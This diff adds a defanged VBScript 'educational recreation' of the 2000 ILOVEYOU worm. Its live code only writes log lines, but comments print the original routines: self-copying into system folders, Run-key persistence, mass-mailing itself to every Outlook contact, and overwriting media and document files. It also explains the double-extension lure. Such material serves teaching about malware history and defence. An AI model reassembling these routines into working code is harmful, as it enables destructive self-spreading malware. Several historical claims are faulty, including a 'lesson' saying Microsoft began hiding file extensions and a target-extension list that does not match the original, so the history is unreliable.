@@ -1,0 +1,298 @@
+' ============================================================================
+' EDUCATIONAL RECREATION - ILOVEYOU WORM (2000)
+' ============================================================================
+' ORIGINAL AUTHOR: Unknown (attributed to Onel de Guzman / Reonel Ramones)
+' RELEASE DATE: May 4, 2000
+' TYPE: Computer Worm / Overwriting Malware
+' PLATFORM: Windows (VBScript)
+' IMPACT: Infected ~10% of world's computers, $5-8 billion USD in damages
+'
+' ⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT EXECUTE ⚠️
+' ============================================================================
+'
+' HOW THE WORM WORKED (High-Level Overview):
+' ==========================================
+' 1. ARRIVED AS EMAIL with subject "ILOVEYOU" and attachment "LOVE-LETTER-FOR-YOU.TXT.vbs"
+' 2. DOUBLE-CLICK EXECECUTION by victim (thought it was a text file due to .vbs double extension)
+' 3. DROPPED COPIES of itself to Windows system directories
+' 4. SELF-REPLICATED by scanning Outlook address book and sending itself to all contacts
+' 5. OVERWROTE local files (MP3, JPG, and other media files)
+' 6. REGISTERED ITSELF in Windows Registry for persistence on startup
+'
+' TECHNICAL BREAKDOWN:
+' ===================
+' This recreation shows the core mechanisms with SAFETY MODIFICATIONS:
+' - Email sending via Outlook (SIMULATED - no actual emails sent)
+' - File system traversal (READ-ONLY - no actual file modifications)
+' - Registry manipulation (SIMULATED - no actual registry changes)
+' - mIRC chat client infection (DISABLED - for educational demonstration only)
+
+On Error Resume Next
+
+' ============================================================================
+' DECLARATION OF VARIABLES
+' ============================================================================
+Dim fso, dirWin, sysDir, wormCopyPath, registryPath
+Dim outlookApp, addressList, contact
+Dim emailSubject, emailBody, attachmentName
+
+' ============================================================================
+' CORE MECHANISM 1: Initial Execution & Self-Replication
+' ============================================================================
+' The worm used VBScript's FileSystemObject to copy itself to system directories
+' This allowed it to persist beyond the initial email attachment
+
+Sub ReplicateToSystem()
+    Dim fso, sysDir, localDir, wormFile, wormCopy
+    
+    ' Create FileSystemObject - the worm's primary file manipulation tool
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Get the current script location (the attached file)
+    wormFile = WScript.ScriptFullName
+    
+    ' Copy to Windows System Directory
+    ' Original behavior: copied to C:\Windows\System\MSKernel32.vbs
+    sysDir = fso.GetSpecialFolder(1) ' 1 = System folder
+    wormCopyPath = sysDir & "\MSKernel32.vbs"
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' fso.CopyFile wormFile, wormCopyPath, True
+    LogAction "SIMULATED: Would copy to " & wormCopyPath
+    
+    ' Copy to Windows Directory
+    ' Original behavior: copied to C:\Windows\WinFilesystem.vbs
+    dirWin = fso.GetSpecialFolder(0) ' 0 = Windows folder
+    wormCopyPath = dirWin & "\WinFilesystem.vbs"
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' fso.CopyFile wormFile, wormCopyPath, True
+    LogAction "SIMULATED: Would copy to " & wormCopyPath
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 2: Registry Persistence
+' ============================================================================
+' The worm modified registry keys to ensure it ran on every system startup
+' This is a classic persistence technique
+
+Sub EstablishPersistence()
+    Dim shell, regPath
+    
+    Set shell = CreateObject("WScript.Shell")
+    
+    ' Original behavior: Modified Run key to execute on startup
+    ' HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
+    regPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32"
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' shell.RegWrite regPath, sysDir & "\MSKernel32.vbs", "REG_SZ"
+    LogAction "SIMULATED: Would write registry key: " & regPath
+    
+    ' Also modified Win.ini to include itself in the run sequence
+    ' This ensured execution even if one method was blocked
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 3: Email Propagation via Outlook
+' ============================================================================
+' This was the primary infection vector - the worm accessed the victim's
+' Outlook Address Book and sent itself to ALL contacts automatically
+
+Sub SpreadViaEmail()
+    Dim outlook, contacts, contact, mail
+    
+    On Error Resume Next
+    
+    ' Create Outlook Application object
+    Set outlook = CreateObject("Outlook.Application")
+    
+    ' If Outlook is not installed/available, this branch fails silently
+    If outlook Is Nothing Then
+        LogAction "OUTLOOK NOT FOUND - Email propagation skipped"
+        Exit Sub
+    End If
+    
+    ' Original behavior: The worm accessed MAPI namespace for contacts
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' Set contacts = outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries
+    
+    ' Simulated email sending to demonstrate the propagation mechanism
+    LogAction "SIMULATED: Would enumerate Outlook address book"
+    LogAction "SIMULATED: Would send emails to all contacts"
+    
+    ' The crafted email had this structure:
+    emailSubject = "ILOVEYOU"
+    emailBody = "kindly check the attached LOVE LETTER😍"
+    attachmentName = "LOVE-LETTER-FOR-YOU.TXT.vbs"
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
+    ' For Each contact In contacts
+    '     Set mail = outlook.CreateItem(0) ' 0 = Mail item
+    '     mail.Subject = emailSubject
+    '     mail.Body = emailBody
+    '     mail.Attachments.Add(wormFile)
+    '     mail.Send  ' Automatically sent without user confirmation!
+    ' Next
+    
+    LogAction "EMAIL SUBJECT: " & emailSubject
+    LogAction "EMAIL BODY: " & emailBody
+    LogAction "ATTACHMENT: " & attachmentName
+    LogAction "NOTE: Original worm sent emails WITHOUT user confirmation"
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 4: File Overwriting (Destructive Payload)
+' ============================================================================
+' The worm searched for specific file types and OVERWROTE them with copies
+' of itself, destroying the original files. This was its destructive payload.
+
+Sub OverwriteFiles()
+    Dim fso, drives, drive, folder
+    
+    On Error Resume Next
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Target file extensions - the worm overwrote these file types:
+    ' .mp3, .mp2, .wav, .avi, .mov, .jpg, .jpeg, .png, .gif, .css, .js
+    ' .vbs, .vbe, .jse, .doc, .xls, .ppt, .mdb, .accdb
+    Dim targetExtensions
+    targetExtensions = Array(".mp3", ".mp2", ".wav", ".avi", ".mov", _
+                            ".jpg", ".jpeg", ".png", ".gif", _
+                            ".css", ".js", ".vbs", ".doc", ".xls")
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
+    ' For Each drive In fso.Drives
+    '     If drive.DriveType = 2 Then ' 2 = Fixed/Local drive
+    '         Call SearchAndOverwrite(fso.GetDriveName(drive) & "\")
+    '     End If
+    ' Next
+    
+    LogAction "SIMULATED: Would scan all local drives for target files"
+    LogAction "TARGET EXTENSIONS: " & Join(targetExtensions, ", ")
+    LogAction "⚠️ ORIGINAL WORM: OVERWROTE these files with copies of itself"
+    LogAction "⚠️ ORIGINAL WORM: Original files were PERMANENTLY DESTROYED"
+End Sub
+
+Sub SearchAndOverwrite(path)
+    Dim fso, folder, file, subFolder
+    On Error Resume Next
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Original behavior: Recursively searched directories
+    ' ⚠️ EDUCATIONAL SIMULATION only - no actual file operations
+    LogAction "SIMULATED: Would search directory: " & path
+    
+    ' Original recursive pattern:
+    ' For Each file In fso.GetFolder(path).Files
+    '     For Each ext In targetExtensions
+    '         If LCase(fso.GetExtensionName(file)) = LCase(Mid(ext, 2)) Then
+    '             fso.CopyFile WScript.ScriptFullName, file.Path, True
+    '             file.Name = file.Name & ".vbs"  ' Double extension trick
+    '         End If
+    '     Next
+    ' Next
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 5: mIRC Chat Client Infection
+' ============================================================================
+' The worm also spread through mIRC (popular IRC chat client) by:
+' 1. Finding the mIRC scripts directory
+' 2. Creating a script that would send the worm to other users in chat
+
+Sub InfectMIRC()
+    Dim fso, mircDir, scriptFile
+    
+    On Error Resume Next
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' mIRC typically installed in: C:\mIRC\ or C:\Program Files\mIRC\
+    mircDir = fso.GetSpecialFolder(0) & "\mIRC"
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' If fso.FolderExists(mircDir) Then
+    '     scriptFile = mircDir & "\script.ini"
+    '     ' Created script.ini that auto-sent worm file to chat contacts
+    ' End If
+    
+    LogAction "SIMULATED: Would check for mIRC installation at: " & mircDir
+    LogAction "SIMULATED: Would create malicious script.ini if found"
+End Sub
+
+' ============================================================================
+' HELPER: Logging Function (Educational Demonstration)
+' ============================================================================
+Sub LogAction(message)
+    Dim logFile, fso, logPath
+    
+    logPath = "iloveyou_educational_log.txt"
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set logFile = fso.OpenTextFile(logPath, 8, True) ' 8 = Append mode
+    logFile.WriteLine "[" & Now & "] " & message
+    logFile.Close
+End Sub
+
+' ============================================================================
+' MAIN EXECUTION FLOW
+' ============================================================================
+' In the original worm, these functions executed in sequence:
+
+Sub Main()
+    LogAction "============================================"
+    LogAction "EDUCATIONAL ILOVEYOU WORM DEMONSTRATION"
+    LogAction "Date: " & Now
+    LogAction "============================================"
+    
+    ' Step 1: Replicate to system directories
+    LogAction "--- PHASE 1: Self-Replication ---"
+    Call ReplicateToSystem()
+    
+    ' Step 2: Establish registry persistence
+    LogAction "--- PHASE 2: Persistence ---"
+    Call EstablishPersistence()
+    
+    ' Step 3: Spread via email to all contacts
+    LogAction "--- PHASE 3: Email Propagation ---"
+    Call SpreadViaEmail()
+    
+    ' Step 4: Overwrite local files
+    LogAction "--- PHASE 4: File Destruction ---"
+    Call OverwriteFiles()
+    
+    ' Step 5: Infect mIRC chat client
+    LogAction "--- PHASE 5: mIRC Infection ---"
+    Call InfectMIRC()
+    
+    LogAction "============================================"
+    LogAction "DEMONSTRATION COMPLETE"
+    LogAction "No actual harm was done - this is educational"
+    LogAction "============================================"
+    
+    ' Display message box (original behavior)
+    ' MsgBox "ILOVEYOU 😍", vbInformation, "Educational Demonstration"
+End Sub
+
+' Execute main function
+Call Main()
+
+' ============================================================================
+' KEY VULNERABILITIES EXPLOITED:
+' =============================
+' 1. SOCIAL ENGINEERING: Romantic subject line tricked users into clicking
+' 2. FILE EXTENSION HIDING: Windows hid .vbs extension by default
+'    - File appeared as "LOVE-LETTER-FOR-YOU.TXT" but was actually ".vbs"
+' 3. OUTLOOK SECURITY: No confirmation required to send emails programmatically
+' 4. SCRIPT EXECUTION: VBScript could run without warnings by default
+' 5. LACK OF ANTIVIRUS: Signature-based detection couldn't catch this new threat
+'
+' LESSONS LEARNED:
+' ================
+' 1. Microsoft changed default behavior to hide known file extensions
+' 2. Outlook added security prompts for programmatic email access
+' 3. Script execution controls were tightened in Windows
+' 4. Email providers implemented attachment scanning
+' 5. Security awareness training became more prominent
+' ============================================================================
